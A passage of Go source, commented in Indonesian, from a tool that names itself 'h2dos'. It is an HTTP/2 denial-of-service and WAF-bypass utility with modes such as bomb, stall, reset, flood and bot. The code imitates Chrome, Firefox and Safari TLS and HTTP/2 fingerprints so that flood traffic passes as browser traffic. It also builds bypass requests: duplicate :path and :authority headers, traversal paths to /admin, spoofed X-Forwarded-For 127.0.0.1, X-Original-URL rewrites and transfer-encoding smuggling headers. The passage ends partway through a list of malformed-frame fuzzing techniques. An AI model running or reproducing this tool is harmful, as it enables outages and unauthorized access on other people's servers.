// listFlag menerima daftar nilai, baik lewat flag yang diulang maupun
// "a,b,c" dalam satu kali tulis.
type listFlag struct{ p *[]string }

func (l listFlag) String() string { return "" }
func (l listFlag) Set(s string) error {
	for _, v := range strings.Split(s, ",") {
		if v = strings.TrimSpace(v); v != "" {
			*l.p = append(*l.p, v)
		}
	}
	return nil
}

func (c *Config) validate() error {
	if c.target == "" {
		return fmt.Errorf("flag -target wajib diisi")
	}
	u, err := url.Parse(c.target)
	if err != nil {
		return fmt.Errorf("URL tidak valid: %w", err)
	}
	if u.Hostname() == "" {
		return fmt.Errorf("-target harus menyertakan host, contoh https://1.2.3.4:443")
	}
	host := u.Hostname()
	if u.Port() != "" {
		host += ":" + u.Port()
	}
	c.hostHdr = host
	// host tanpa port tidak bisa dipakai net.Dial.
	c.dialHost = host
	if u.Port() == "" {
		if u.Scheme == "https" {
			c.dialHost += ":443"
		} else {
			c.dialHost += ":80"
		}
	}
	c.authority = host
	if u.RequestURI() != "" && u.RequestURI() != "/" {
		c.path = u.RequestURI()
	}
	if c.path == "" {
		c.path = "/"
	}
	if u.Scheme == "https" {
		c.scheme = "https"
	} else {
		c.scheme = "http"
	}
	switch c.mode {
	case "bomb", "stall", "myreset", "contflood", "flood", "reset", "bot", "fez", "bypass":
	default:
		return fmt.Errorf("modus -mode tidak dikenal: %q", c.mode)
	}
	if c.conns < 1 {
		c.conns = 1
	}
	if c.streams < 0 {
		c.streams = 0
	}
	if c.streams == 0 {
		c.streams = 1 << 20
	}
	if c.batch < 1 {
		c.batch = 1
	}
	if c.bombRefs < 1 {
		c.bombRefs = 1
	}
	if c.bombName == "" {
		c.bombName = "x-bomb"
	}
	if c.stallIv < 50*time.Millisecond {
		c.stallIv = 50 * time.Millisecond
	}
	if c.contSize < 1 {
		c.contSize = 1
	}
	switch c.myrPrim {
	case "data", "window", "priority":
	default:
		return fmt.Errorf("-myr-prim harus data | window | priority, dapat %q", c.myrPrim)
	}
	c.badCodes = map[int]bool{}
	for _, s := range strings.Split(c.probeBad, ",") {
		s = strings.TrimSpace(s)
		if s == "" {
			continue
		}
		n, err := strconv.Atoi(s)
		if err != nil {
			return fmt.Errorf("-probe-bad harus daftar kode HTTP dipisah koma, dapat %q", s)
		}
		c.badCodes[n] = true
	}
	// --- modus bot / fez / bypass ---
	if c.mode == "bot" {
		// browser sungguhan tidak memipelin puluhan request: satu stream per
		// permintaan, beberapa stream terbuka bersamaan
		c.batch = 1
		if c.streams > 15 {
			c.streams = 6
		}
		if c.streams < 1 {
			c.streams = 1
		}
		if c.botThink < 10*time.Millisecond {
			c.botThink = 10 * time.Millisecond
		}
		if c.botReuse < 1 {
			c.botReuse = 1
		}
	}
	if c.mode == "fez" {
		c.batch = 1
		if c.fezN < 1 {
			c.fezN = 1
		}
		c.recycle = c.fezN
		if len(c.fezOnly) > 0 {
			known := map[string]bool{}
			for _, t := range fezTechs {
				known[t.id] = true
			}
			for _, t := range c.fezOnly {
				if !known[t] {
					return fmt.Errorf("-fez-only: teknik %q tidak kenal (lihat -fez-list)", t)
				}
			}
		}
	}
	if c.mode == "bypass" {
		c.batch = 1
		if c.recycle == 0 {
			c.recycle = 1 // satu koneksi per permintaan: tiap teknik diuji segar
		}
		known := map[string]bool{}
		for _, t := range bypassTechs {
			known[t.id] = true
		}
		for _, t := range c.bypass {
			if !known[t] {
				return fmt.Errorf("-bypass: teknik %q tidak kenal (lihat -bypass-list)", t)
			}
		}
	}
	return nil
}

// reqBuilder membangkitkan blok HEADERS untuk satu permintaan. Tiap modus
// punya penggantinya sendiri: standar, browser (bot), atau teknik bypass.
type reqBuilder interface {
	next(r *rand.Rand, path string) []byte
}

// builder menyusun blok header request. basePre = pseudo-header (:method, :scheme,
// :authority); basePost = header reguler yang boleh menyusul setelah :path.
type builder struct {
	basePre  []byte
	basePost []byte
}

func newBuilder(c *Config) *builder {
	pre := make([]byte, 0, 256)
	switch strings.ToUpper(c.method) {
	case "HEAD":
		pre = append(pre, hdrMethodHead...)
	case "GET":
		pre = append(pre, hdrMethodGet...)
	default:
		pre = hpackField(pre, ":method", strings.ToUpper(c.method))
	}
	if c.scheme == "https" {
		pre = append(pre, hdrSchemeTLS...)
	} else {
		pre = append(pre, hdrSchemeHTTP...)
	}
	pre = hpackFieldH(pre, ":authority", c.authority)

	post := make([]byte, 0, 256)
	post = hpackField(post, "user-agent", "Mozilla/5.0 (X11; Linux x86_64) h2dos/1.0")
	post = hpackField(post, "accept", "*/*")
	post = hpackField(post, "accept-encoding", "gzip, deflate")
	return &builder{basePre: pre, basePost: post}
}

var crumbChars = "abcdefghijklmnopqrstuvwxyz0123456789"

var dumpOnce sync.Once

// dumpOnce menyimpan blok HEADERS pertama ke file untuk diperiksa dengan
// dekodere HPACK rujukan (validasi silang).
func dumpBlock(hp []byte) {
	if cfg.dump == "" {
		return
	}
	dumpOnce.Do(func() {
		if err := os.WriteFile(cfg.dump, hp, 0o644); err != nil {
			fmt.Fprintln(os.Stderr, "dump:", err)
		}
	})
}

func (bl *builder) next(r *rand.Rand, path string) []byte {
	out := make([]byte, 0, len(bl.basePre)+len(bl.basePost)+256)
	out = append(out, bl.basePre...)
	p := path
	if cfg.bust {
		if strings.Contains(p, "?") {
			p += fmt.Sprintf("&n=%d", r.Uint64())
		} else {
			p += fmt.Sprintf("?n=%d", r.Uint64())
		}
	}
	out = hpackFieldH(out, ":path", p)
	out = append(out, bl.basePost...)
	for _, h := range cfg.headers {
		i := strings.IndexByte(h, ':')
		if i < 1 {
			continue
		}
		out = hpackField(out, strings.TrimSpace(h[:i]), strings.TrimSpace(h[i+1:]))
	}
	for i := 0; i < cfg.junk; i++ {
		nm := make([]byte, 6)
		for j := range nm {
			nm[j] = crumbChars[r.IntN(len(crumbChars))]
		}
		vl := make([]byte, 32)
		for j := range vl {
			vl[j] = crumbChars[r.IntN(len(crumbChars))]
		}
		out = hpackField(out, "x-"+string(nm), string(vl))
	}
	return out
}

// ---------------- statistik ----------------

type stats struct {
	reqs, resp, bytes, out, frames     atomic.Int64
	connsUp, connsLive                 atomic.Int64
	errDial, errTLS, errWrite, errRead atomic.Int64
	errGoaway, errStall, errRot        atomic.Int64
	errOther                           atomic.Int64
	peakRPS                            atomic.Int64
	rssKB                              atomic.Int64
	peakRssKB                          atomic.Int64
	probeMS                            atomic.Int64
	probeCode                          atomic.Int64
	probeOK                            atomic.Bool
	mu                                 sync.Mutex
	errNames                           map[string]int
	shown                              int
}

func (st *stats) errCat(kind string, err error) {
	if cfg.verbose {
		st.mu.Lock()
		if st.shown < 40 {
			fmt.Fprintf(os.Stderr, "[err] %s: %v\n", kind, err)
			st.shown++
		}
		st.mu.Unlock()
	}
	switch kind {
	case "dial":
		st.errDial.Add(1)
	case "tls":
		st.errTLS.Add(1)
	case "write":
		st.errWrite.Add(1)
	case "read":
		st.errRead.Add(1)
	case "goaway":
		st.errGoaway.Add(1)
	case "stall":
		st.errStall.Add(1)
	case "rotasi":
		st.errRot.Add(1)
	default:
		st.errOther.Add(1)
	}
}

func (st *stats) snapshot() (reqs, resp, bytes int64, errs map[string]int64) {
	reqs, resp, bytes = st.reqs.Load(), st.resp.Load(), st.bytes.Load()
	errs = map[string]int64{
		"dial": st.errDial.Load(), "tls": st.errTLS.Load(), "write": st.errWrite.Load(),
		"read": st.errRead.Load(), "goaway": st.errGoaway.Load(), "stall": st.errStall.Load(),
		"rotasi": st.errRot.Load(), "lain": st.errOther.Load(),
	}
	return
}

func topErrors(errs map[string]int64, n int) string {
	type kv struct {
		k string
		v int64
	}
	var list []kv
	for k, v := range errs {
		if v > 0 {
			list = append(list, kv{k, v})
		}
	}
	if len(list) == 0 {
		return "-"
	}
	sort.Slice(list, func(i, j int) bool { return list[i].v > list[j].v })
	if len(list) > n {
		list = list[:n]
	}
	parts := make([]string, len(list))
	for i, e := range list {
		parts[i] = fmt.Sprintf("%s=%d", e.k, e.v)
	}
	return strings.Join(parts, ", ")
}

var ackFrames atomic.Bool

// connLim membatasi laju koneksi baru (flood handshake TLS).
var connLim *bucket

// holdWindow: modus bomb/stall menahan respons dengan jendela 0 byte, jadi jangan
// mengucurkan kredit stream saat membaca HEADERS balasan.
var holdWindow atomic.Bool

// browserLike: modus bot meniru perilaku browser, termasuk membalas PING.
var browserLike atomic.Bool

// ---------------- rate limiter ----------------

type bucket struct {
	mu          sync.Mutex
	rate, burst float64
	tokens      float64
	last        time.Time
}

func newBucket(rate float64) *bucket {
	if rate <= 0 {
		return nil
	}
	return &bucket{rate: rate, burst: rate, tokens: rate, last: time.Now()}
}

func (b *bucket) wait(ctx context.Context, n float64) error {
	if b == nil {
		return nil
	}
	for {
		b.mu.Lock()
		now := time.Now()
		b.tokens += now.Sub(b.last).Seconds() * b.rate
		if b.tokens > b.burst {
			b.tokens = b.burst
		}
		b.last = now
		if b.tokens >= n {
			b.tokens -= n
			b.mu.Unlock()
			return nil
		}
		need := (n - b.tokens) / b.rate
		b.mu.Unlock()
		t := time.NewTimer(time.Duration(need * float64(time.Second)))
		select {
		case <-ctx.Done():
			t.Stop()
			return ctx.Err()
		case <-t.C:
		}
	}
}

// ---------------- koneksi & pembacaan ----------------

// dial membuka koneksi (h2 lewat TLS, atau h2c). Profil browser menentukan ALPN
// dan kurva TLS sehingga sidik jari koneksi juga ikut ditiru.
func dial(ctx context.Context, st *stats, p *prof) (net.Conn, error) {
	d := net.Dialer{Timeout: cfg.dialTO}
	c, err := d.DialContext(ctx, "tcp", cfg.dialHost)
	if err != nil {
		if ctx.Err() == nil {
			st.errCat("dial", err)
		}
		return nil, err
	}
	if tc, ok := c.(*net.TCPConn); ok {
		_ = tc.SetNoDelay(cfg.nodelay)
		_ = tc.SetWriteBuffer(cfg.buf)
	}
	if cfg.scheme == "https" {
		cname := cfg.authority
		if i := strings.LastIndexByte(cname, ':'); i > 0 {
			cname = cname[:i]
		}
		if net.ParseIP(cname) != nil {
			cname = ""
		}
		tctx, cancel := context.WithTimeout(ctx, cfg.dialTO)
		defer cancel()
		tlsCfg := &tls.Config{
			ServerName:         cname,
			InsecureSkipVerify: cfg.insecure,
			NextProtos:         []string{"h2"},
		}
		if p != nil {
			if len(p.alpn) > 0 {
				tlsCfg.NextProtos = append([]string(nil), p.alpn...)
			}
			if len(p.curves) > 0 {
				tlsCfg.CurvePreferences = append([]tls.CurveID(nil), p.curves...)
			}
			// Chrome/Edge hanya menawarkan suite TLS 1.3 modern
			if strings.HasPrefix(p.name, "chrome") || strings.HasPrefix(p.name, "edge") {
				tlsCfg.MaxVersion = tls.VersionTLS13
				tlsCfg.CipherSuites = []uint16{
					tls.TLS_AES_128_GCM_SHA256,
					tls.TLS_AES_256_GCM_SHA384,
					tls.TLS_CHACHA20_POLY1305_SHA256,
				}
			}
		}
		tc := tls.Client(c, tlsCfg)
		if err := tc.HandshakeContext(tctx); err != nil {
			if ctx.Err() == nil {
				st.errCat("tls", err)
			}
			c.Close()
			return nil, err
		}
		if proto := tc.ConnectionState().NegotiatedProtocol; proto != "h2" {
			c.Close()
			if ctx.Err() == nil {
				st.errCat("tls", fmt.Errorf("ALPN nego %q (bukan h2)", proto))
			}
			return nil, fmt.Errorf("alpn: %s", proto)
		}
		c = tc
	}
	return c, nil
}

// readLoop membaca frame lawan supaya socket tidak macet: payload dibuang, tapi
// kredit flow-control (koneksi + per stream) dikembalikan dan SETTINGS/GOAWAY dicatat.
func readLoop(c net.Conn, st *stats, m *connMeta, ctl chan []byte) error {
	hdr := make([]byte, 9)
	var p []byte
	recv := 0            // byte yang belum dibayar balik ke jendela KIRIM kita
	strmRecv := int64(0) // byte DATA yang belum dibayar balik ke jendela terima server
	for {
		if _, err := io.ReadFull(c, hdr); err != nil {
			return err
		}
		n := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
		typ, flags := hdr[3], hdr[4]
		stream := uint32(hdr[5])<<24 | uint32(hdr[6])<<16 | uint32(hdr[7])<<8 | uint32(hdr[8])
		if n > 1<<22 {
			return errors.New("frame terlalu besar")
		}
		if cap(p) < n {
			p = make([]byte, n)
		}
		p = p[:n]
		if n > 0 {
			if _, err := io.ReadFull(c, p); err != nil {
				return err
			}
		}
		// Setiap byte yang kita baca harus dibayar balik dengan WINDOW_UPDATE, di
		// level koneksi DAN level stream. Tanpa ini jendela kirim kita (default
		// 65.535 byte) cepat habis dan server menutup koneksi.
		recv += n
		if typ == frData && stream != 0 {
			strmRecv += int64(n)
		}
		if !holdWindow.Load() {
			if recv >= 16384 {
				connCredit(c, uint32(recv))
				recv = 0
			}
			if strmRecv >= 16384 && typ == frData && stream != 0 {
				f := []byte{0, 0, 4, frWindowUpdate, 0,
					byte(stream >> 24), byte(stream >> 16), byte(stream >> 8), byte(stream),
					byte(strmRecv >> 24), byte(strmRecv >> 16), byte(strmRecv >> 8), byte(strmRecv)}
				if _, err := c.Write(f); err != nil {
					return err
				}
				strmRecv = 0
			}
		}
		switch typ {
		case frHeaders, frPushPromise:
			if flags&flEndHeaders != 0 {
				st.resp.Add(1)
				// stream sudah dijawab: slot konkuren bebas lagi.
				m.openStreams.Add(-1)
				// Beri stream ini jendela besar SEKALI saja: beberapa server memakai
				// INITIAL_WINDOW_SIZE kecil dan akan macet di tengah body.
				if !holdWindow.Load() && stream != 0 {
					f := []byte{0, 0, 4, frWindowUpdate, 0,
						byte(stream >> 24), byte(stream >> 16), byte(stream >> 8), byte(stream),
						0x3f, 0xff, 0xff, 0xff}
					if _, err := c.Write(f); err != nil {
						return err
					}
				}
			}
		case frData:
			st.bytes.Add(int64(n))
		case frSettings:
			if flags&flAck == 0 {
				for i := 0; i+5 < len(p); i += 6 {
					id := uint16(p[i])<<8 | uint16(p[i+1])
					v := uint32(p[i+2])<<24 | uint32(p[i+3])<<16 | uint32(p[i+4])<<8 | uint32(p[i+5])
					if id == settingMaxConns && v > 0 {
						ms := int64(v)
						if ms > 1<<20 {
							ms = 1 << 20
						}
						m.maxStreams.Store(ms)
					}
				}
				if ackFrames.Load() {
					select {
					case ctl <- nil:
					default:
					}
				}
			}
		case frPing:
			if flags&flAck == 0 {
				if browserLike.Load() { // browser sungguhan selalu menjawab PING
					ack := make([]byte, 8)
					copy(ack, p[:min(8, len(p))])
					if _, err := c.Write(append([]byte{0, 0, 8, frPing, flAck, 0, 0, 0, 0}, ack...)); err != nil {
						return err
					}
				}
				if ackFrames.Load() {
					select {
					case ctl <- nil:
					default:
					}
				}
			}
		case frGoaway:
			code := uint32(0)
			if len(p) >= 8 {
				code = uint32(p[4])<<24 | uint32(p[5])<<16 | uint32(p[6])<<8 | uint32(p[7])
			}
			if !m.goaway.Swap(true) {
				st.errCat("goaway", fmt.Errorf("GOAWAY kode %d %s", code, goawayNames[code]))
				if t := nowTech(); t != "" {
					catatReaksi(t, "GOAWAY "+goawayNames[code])
				}
			}
			return errGoaway
		case frReset:
			m.inflight.Add(-1)
		}
	}
}

var errGoaway = errors.New("goaway")

// connCredit mengirim WINDOW_UPDATE level koneksi. Tanpa ini kita cepat sekali
// kehabisan jendela KIRIM (default 65.535 byte), sehingga server men-batch respons
// besar dan menutup koneksi dengan FLOW_CONTROL/FRAME_SIZE_ERROR.
func connCredit(c net.Conn, inc uint32) {
	f := []byte{0, 0, 4, frWindowUpdate, 0, 0, 0, 0, 0,
		byte(inc >> 24), byte(inc >> 16), byte(inc >> 8), byte(inc)}
	_, _ = c.Write(f)
}

// ---------------- modus bot / fez / bypass ----------------

// hpackEncoder menyusun blok HEADERS gaya browser: nama header di-INSERT ke
// dynamic table pada request pertama, lalu direferensikan dengan 1 byte pada
// request berikutnya, dan seluruh string dimampat dengan Huffman.
type hpackEncoder struct {
	b      []byte
	nextIx int
}

func newHpackEnc(cap int) *hpackEncoder {
	return &hpackEncoder{b: make([]byte, 0, cap), nextIx: 62}
}

// idx: indexed header field, prefix 7 bit.
func (e *hpackEncoder) idx(i int) {
	e.b = hpackWrInt(e.b, 7, 0x80, i)
}

// litName: nilai literal dengan nama dari tabel statis, prefix indeks 4 bit.
// Indeks di atas 14 butuh byte lanjutan (0x1f + sisanya), jadi tidak boleh
// ditulis dengan satu byte.
func (e *hpackEncoder) litName(i int, v string) {
	e.b = hpackWrInt(e.b, 4, 0x10, i)
	e.b = hpackHuff(e.b, v)
}

// ins menambahkan header ke dynamic table lawan (prefix 6 bit) dan mengembalikan
// indeks dinamis yang bisa dipakai ulang.
func (e *hpackEncoder) ins(i int, v string) int {
	e.b = hpackWrInt(e.b, 6, 0x40, i)
	e.b = hpackHuff(e.b, v)
	n := e.nextIx
	e.nextIx++
	return n
}

// insRaw: INSERT dengan nama string penuh (header di luar tabel statis).
func (e *hpackEncoder) insRaw(i int, name, v string) int {
	e.b = hpackWrInt(e.b, 6, 0x40, i)
	e.b = hpackHuff(e.b, name)
	e.b = hpackHuff(e.b, v)
	n := e.nextIx
	e.nextIx++
	return n
}

type prof struct {
	name, ua  string
	ids       []uint32
	extra     []byte
	order     string // a=accept-language e=accept u=user-agent c=accept-encoding m=sec-fetch-mode s=sec-ch-ua p=priority
	alpn      []string
	curves    []tls.CurveID
	litPseudo bool // :method/:scheme sebagai literal bernama-indeks (gaya Firefox/Safari)
}

// indeks nama header di tabel statis (RFC 7541 A)
const (
	iAccept = 19 // accept
	iALang  = 17 // accept-language
	iEnc    = 16 // accept-encoding
	iUA     = 58 // user-agent
	iRefer  = 51 // referer
)

// browserProfiles: sidik jari yang ditiru. Nilai SETTINGS di bawah adalah nilai
// nyata yang diumumkan klien tersebut (dipublikkan lewat h2spec/PEAKHOUR).
func browserProfiles() []*prof {
	return []*prof{
		{
			name:   "chrome/131",
			ua:     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
			ids:    []uint32{0x1, 4096, 0x2, 0, 0x4, 6291456, 0x6, 65536},
			order:  "sgokuatmdrecp",
			alpn:   []string{"h3", "h2", "http/1.1"},
			curves: []tls.CurveID{tls.X25519, tls.CurveP256},
		},
		{
			name:   "edge/131",
			ua:     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
			ids:    []uint32{0x1, 4096, 0x2, 0, 0x4, 6291456, 0x6, 65536},
			order:  "sgokuatmdrecp",
			alpn:   []string{"h3", "h2", "http/1.1"},
			curves: []tls.CurveID{tls.X25519, tls.CurveP256},
		},
		{
			name:      "firefox/132",
			ua:        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
			ids:       []uint32{0x1, 4096, 0x4, 268435456},
			extra:     []byte{0, 7, 0, 0, 4, 1},
			order:     "uacekdtm",
			alpn:      []string{"h2", "http/1.1"},
			curves:    []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
			litPseudo: true,
		},
		{
			name:      "safari/17.2",
			ua:        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
			ids:       []uint32{0x2, 0, 0x3, 100, 0x4, 2097152, 0x5, 16384},
			order:     "duatmrc",
			alpn:      []string{"h2", "http/1.1"},
			curves:    []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
			litPseudo: true,
		},
	}
}

// pickProfile memilih sidik jari browser; -browser memaksa satu merek.
func pickProfile(r *rand.Rand) *prof {
	ps := browserProfiles()
	if cfg.browser != "" && cfg.browser != "auto" {
		for _, p := range ps {
			if strings.HasPrefix(p.name, cfg.browser) {
				return p
			}
		}
	}
	return ps[r.IntN(len(ps))]
}

// settings merakit payload SETTINGS sesuai profil.
func (p *prof) settings() []byte {
	b := settingsPayload(p.ids...)
	if len(p.extra) > 0 {
		b = append(b, p.extra...)
	}
	return b
}

// browserBld membangun blok HEADERS bergaya browser untuk SATU koneksi:
// header yang sama di-INSERT sekali ke dynamic table, lalu direferensikan
// 1 byte pada request berikutnya - persis seperti browser sungguhan.
type browserBld struct {
	pre, post []byte
	bodies    []string
	rnd       *rand.Rand
}

func newBrowserBld(p *prof, c *Config, paths []string, r *rand.Rand) *browserBld {
	e := newHpackEnc(1024)
	if p.litPseudo { // Firefox/Safari: nama dari tabel statis, nilai literal
		e.litName(2, "GET")
		if c.scheme == "https" {
			e.litName(7, "https")
		} else {
			e.litName(7, "http")
		}
	} else { // Chrome/Edge: indexed penuh
		e.idx(2)
		if c.scheme == "https" {
			e.idx(7)
		} else {
			e.idx(6)
		}
	}
	e.litName(1, c.authority)
	// pseudo-header harus selesai sebelum header reguler (RFC 7541 8.1.2.1),
	// jadi :path disisipkan di sini dan header reguler mulai dihitung setelahnya
	post := len(e.b)
	for _, ch := range []byte(p.order) {
		switch ch {
		case 'a':
			e.ins(iAccept, "*/*")
		case 'c':
			e.ins(iALang, "en-US,en;q=0.9")
		case 'e':
			e.ins(iEnc, "gzip, deflate, br, zstd")
		case 'u':
			e.ins(iUA, p.ua)
		case 'r':
			e.ins(iRefer, "https://"+c.authority+"/")
		case 'g':
			e.insRaw(0, "upgrade-insecure-requests", "?1")
		case 'm':
			e.insRaw(0, "sec-fetch-mode", "navigate")
		case 't':
			e.insRaw(0, "sec-fetch-site", "same-origin")
		case 'd':
			e.insRaw(0, "sec-fetch-dest", "document")
		case 's':
			e.insRaw(0, "sec-ch-ua", `"Not?A_Brand";v="8", "Chromium";v="131"`)
		case 'k':
			e.insRaw(0, "sec-ch-ua-mobile", "?1")
		case 'o':
			e.insRaw(0, "sec-ch-ua-platform", `"Windows"`)
		case 'p':
			e.insRaw(0, "priority", "u=1, i")
		}
	}
	return &browserBld{
		pre:  append([]byte(nil), e.b[:post]...),
		post: append([]byte(nil), e.b[post:]...),
		rnd:  r, bodies: paths,
	}
}

// next menyusun permintaan berikutnya. :path selalu literal baru (browser pun
// begitu saat pindah URL), sisanya sudah ter-mampat di dynamic table.
func (bb *browserBld) next(r *rand.Rand, path string) []byte {
	p := path
	if len(bb.bodies) > 0 {
		p = bb.bodies[bb.rnd.IntN(len(bb.bodies))]
	}
	if cfg.bust {
		if strings.Contains(p, "?") {
			p += fmt.Sprintf("&n=%d", r.Uint64())
		} else {
			p += fmt.Sprintf("?n=%d", r.Uint64())
		}
	}
	out := make([]byte, 0, len(bb.pre)+len(bb.post)+len(p)+4)
	out = append(out, bb.pre...)
	out = append(out, 0x10|4) // :path literal, nama dari tabel statis
	out = hpackHuff(out, p)
	return append(out, bb.post...)
}

// botBld menyamar jadi browser (pola header + dynamic table + Huffman).
type botBld struct{ inner *browserBld }

func (b *botBld) next(r *rand.Rand, path string) []byte { return b.inner.next(r, path) }

// fezBld memakai blok header normal, muatan anomali ditempel terpisah.
type fezBld struct{ base reqBuilder }

func (b *fezBld) next(r *rand.Rand, path string) []byte { return b.base.next(r, path) }

// bypassBld menyusun blok HEADERS sesuai teknik bypass yang dipilih.
type bypassBld struct {
	tech string
	vary int
}

func (b *bypassBld) next(r *rand.Rand, path string) []byte {
	return bypassBlock(b.tech, &cfg, r, b.vary)
}

// plainBld membungkus builder standar supaya sama-sama reqBuilder.
type plainBld struct{ b *builder }

func (p *plainBld) next(r *rand.Rand, path string) []byte { return p.b.next(r, path) }

// bypassTechs adalah daftar trik yang dicoba ke WAF/CDN lewat HTTP/2 murni.
var bypassTechs = []struct {
	id, nama, guna string
}{
	{"plain", "baseline", "permintaan normal, pembanding"},
	{"upper", "nama header huruf besar", "banyak aturan WAFcocok case-sensitive"},
	{"duppath", ":path dobel", "WAF periksa yang pertama, origin pakai yang terakhir"},
	{"duphost", ":authority dobel", "uji inkonsistensi routing WAF vs origin"},
	{"dupua", "user-agent dobel", "value pertama lolos aturan, value kedua dipakai origin"},
	{"encpath", "encoding di :path", "%2e%2e, %252e, spasi %20"},
	{"dotdot", "traversal + query", "/..;/, /./, /;=a/../"},
	{"case", "huruf besar di path", "/ADMIN, /Dashboard"},
	{"method", "X-HTTP-Method-Override", "POST->GET/DELETE dan X-Method-Override"},
	{"rawhost", "host lowercase + :authority", "dua sumber hostname berbeda"},
	{"xforward", "X-Forwarded-For/Proto dobel", "spoof IP & skema ke origin"},
	{"xrewr", "X-Rewrite-URL / X-Original-URL", "paksa path lain di origin"},
	{"te", "Transfer-Encoding aneh", "transfer-encoding: gzip, chunked (CL.TE/TE.CL)"},
	{"cookie", "cookie dimampat penuh", "payload besar lewat Huffman 1 entri"},
	{"longpath", "path sangat panjang", "melewati batas panjang aturan/regex WAF"},
	{"tabspace", "nilai diawali spasi", "normalisasi header berbeda di WAF vs origin"},
	{"semicolon", "matriks parameter di path", "/x;jsessionid=1/../secret"},
	{"prio", "PRIORIY + header typo", "nama header tak lazim di depan"},
}

// bypassBlock membangun blok HEADERS untuk satu teknik bypass. var memilih
// varian acak untuk teknik yang punya beberapa bentuk.
func bypassBlock(id string, c *Config, r *rand.Rand, vary int) []byte {
	e := newHpackEnc(1024)
	path := c.path
	switch id {
	case "encpath":
		path = []string{"/%2e%2e/admin", "/%252e%252e/admin", "/x%20y", "/..%2f..%2fadmin", "/%2u002e/admin"}[vary%5]
	case "dotdot":
		path = []string{"/..;/admin", "/.//admin", "/a/../../admin", "/x/..%2fadmin", "/....//admin"}[vary%5]
	case "case":
		if vary%2 == 0 {
			path = strings.ToUpper(path)
		} else {
			path = "/AdMiN" + path
		}
	case "longpath":
		path = path + "/../" + strings.Repeat("a", 200+vary*37) + "/admin"
	case "semicolon":
		path = "/x;jsessionid=" + strings.Repeat("1", 30+vary) + "/.." + path
	}
	e.idx(2) // :method GET
	if c.scheme == "https" {
		e.idx(7)
	} else {
		e.idx(6)
	}
	e.litName(1, c.authority)
	e.litName(4, path)

	ua := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
	switch id {
	case "upper":
		litRaw(e, "User-Agent", ua)
		litRaw(e, "Accept", "*/*")
		litRaw(e, "Accept-Language", "en-US,en;q=0.9")
	case "duppath":
		e.litName(4, "/normal")
		e.litName(4, "/admin")
		litRaw(e, "user-agent", ua)
	case "duphost":
		e.litName(1, "evil.example.com")
		litRaw(e, "user-agent", ua)
	case "dupua":
		litRaw(e, "user-agent", ua)
		litRaw(e, "user-agent", "Googlebot/2.1 (+http://www.google.com/bot.html)")
	case "method":
		litRaw(e, "user-agent", ua)
		litRaw(e, "x-http-method-override", "GET")
		litRaw(e, "x-method-override", "DELETE")
		litRaw(e, "x-http-method-override", "PUT")
	case "rawhost":
		litRaw(e, "user-agent", ua)
		litRaw(e, "host", strings.ToLower(c.authority))
	case "xforward":
		litRaw(e, "user-agent", ua)
		for _, h := range [][2]string{
			{"x-forwarded-for", "127.0.0.1"},
			{"x-forwarded-for", "8.8.8.8"},
			{"x-forwarded-proto", "http"},
			{"x-forwarded-host", c.authority},
			{"client-ip", "127.0.0.1"},
			{"true-client-ip", "127.0.0.1"},
		} {
			litRaw(e, h[0], h[1])
		}
	case "xrewr":
		litRaw(e, "user-agent", ua)
		litRaw(e, "x-rewrite-url", "/admin")
		litRaw(e, "x-original-url", "/admin")
		litRaw(e, "x-original-path", "/admin")
	case "te":
		litRaw(e, "user-agent", ua)
		if vary%2 == 0 {
			litRaw(e, "transfer-encoding", "gzip, chunked")
		} else {
			litRaw(e, "transfer-encoding", "chunked")
			litRaw(e, "content-length", "5")
		}
	case "cookie":
		e.b = append(e.b, 0x40) // INSERT cookie (satu entri, nilai besar)
		e.b = hpackHuff(e.b, "cookie")
		var sb strings.Builder
		for i := 0; i < 60; i++ {
			fmt.Fprintf(&sb, "s%d=%s;", i, strings.Repeat("a", 20))
		}
		e.b = hpackHuff(e.b, sb.String())
		litRaw(e, "user-agent", ua)
	case "tabspace":
		litRaw(e, "user-agent", ua)
		litRaw(e, "x-audit", "  spaced-value")
		litRaw(e, "x-audit", "\tsecond")
	case "prio":
		litRaw(e, "PRIORIY", "1")
		litRaw(e, "X-Forwarded-For", "127.0.0.1")
		litRaw(e, "user-agent", ua)
	default: // plain dan teknik yang cukup dengan permintaannya saja
		litRaw(e, "user-agent", ua)
		litRaw(e, "accept", "*/*")
	}
	return e.b
}

// litRaw menulis header literal tanpa mengubah besar-kecil nama yang diberikan.
func litRaw(e *hpackEncoder, name, v string) {
	e.b = append(e.b, 0x10)
	e.b = hpackHuff(e.b, name)
	e.b = hpackHuff(e.b, v)
}

// ---------------- fez: fuzzer kepatuhan HTTP/2 ----------------

// lastFez menyimpan teknik yang sedang dipakai koneksi aktif supaya GOAWAY yang
// diterima bisa dikaitkan dengan anomali pemicunya.
var lastFez atomic.Int64

var fezTechs = []struct {
	id, nama string
}{
	{"sett-id", "SETTINGS id tak dikenal"},
	{"sett-hts", "HEADER_TABLE_SIZE = 2^31"},
	{"sett-mfs", "MAX_FRAME_SIZE = 0"},
	{"sett-mfs2", "MAX_FRAME_SIZE = 2^22+1"},
	{"sett-iws", "INITIAL_WINDOW_SIZE = 2^31"},
	{"sett-dup", "SETTINGS duplikat 4x"},
	{"wu-zero", "WINDOW_UPDATE increment 0"},
	{"wu-big", "WINDOW_UPDATE koneksi 2^31"},
	{"data-closed", "DATA ke stream selesai (closed)"},
	{"data-conn", "DATA di stream 0"},
	{"data-big", "DATA melampaui MAX_FRAME_SIZE"},
	{"hdr-even", "HEADERS stream genap (idle)"},
	{"hdr-zero", "HEADERS stream 0"},
	{"hdr-empty", "HEADERS tanpa blok header"},
	{"cont-solo", "CONTINUATION tanpa HEADERS"},
	{"cont-zero", "CONTINUATION panjang 0"},
	{"cont-badstream", "CONTINUATION stream 0"},
